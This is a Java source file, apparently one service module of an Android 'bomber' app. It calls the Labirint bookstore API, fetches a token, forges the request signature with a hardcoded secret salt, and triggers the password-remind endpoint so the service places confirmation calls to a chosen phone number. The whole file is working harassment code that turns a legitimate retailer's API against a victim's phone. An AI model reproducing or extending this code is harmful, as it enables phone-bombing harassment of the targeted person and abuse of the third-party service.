package com.dm.bomber.services;

import androidx.annotation.NonNull;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Objects;

import okhttp3.Call;
import okhttp3.HttpUrl;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class Labirint extends Service {

    public static String md5(String string) {
        MessageDigest messageDigest;
        byte[] digest = new byte[0];

        try {
            messageDigest = MessageDigest.getInstance("MD5");
            messageDigest.reset();
            messageDigest.update(string.getBytes());

            digest = messageDigest.digest();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }

        BigInteger bigInt = new BigInteger(1, digest);
        StringBuilder md5Hex = new StringBuilder(bigInt.toString(16));

        while (md5Hex.length() < 32) {
            md5Hex.insert(0, "0");
        }

        return md5Hex.toString();
    }

    @Override
    public void run(OkHttpClient client, Callback callback) {
        client.newCall(new Request.Builder()
                .url(Objects.requireNonNull(HttpUrl.parse("https://api.labirint.ru/v3/token")).newBuilder()
                        .addQueryParameter("build", "3720")
                        .addQueryParameter("version", "3.1.0")
                        .addQueryParameter("bundleId", "11532537")
                        .addQueryParameter("debug", "false")
                        .addQueryParameter("timeZone", "+3")
                        .addQueryParameter("imageSize", "2")
                        .addQueryParameter("token", "")
                        .addQueryParameter("sig", "d29d04eef23dbac42fd28cc124f10e3a")
                        .build())
                .get()
                .build()).enqueue(new okhttp3.Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                callback.onFailure(call, e);
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                try {
                    JSONObject json = new JSONObject(Objects.requireNonNull(response.body()).string());

                    String sign = json.getString("token") + "build3720bundleId11532537confirmTypecalldebugfalseimageSize2phone" +
                            getFormattedPhone() + "timeZone+3token" +
                            json.getString("token") + "version3.1.0d21b9f04fc6acebbc984b896918f650b";


                    client.newCall(new Request.Builder()
                            .url(Objects.requireNonNull(HttpUrl.parse("https://api.labirint.ru/v3/user/remind")).newBuilder()
                                    .addQueryParameter("build", "3720")
                                    .addQueryParameter("version", "3.1.0")
                                    .addQueryParameter("bundleId", "11532537")
                                    .addQueryParameter("debug", "false")
                                    .addQueryParameter("timeZone", "+3")
                                    .addQueryParameter("imageSize", "2")
                                    .addQueryParameter("token", json.getString("token"))
                                    .addQueryParameter("sig", md5(sign))
                                    .build())
                            .post(RequestBody.create(new JSONObject()
                                    .put("confirmType", "call")
                                    .put("phone", getFormattedPhone())
                                    .toString(), MediaType.parse("application/json")))
                            .build()).enqueue(callback);
                } catch (JSONException e) {
                    callback.onError(e);
                }
            }
        });
    }
}
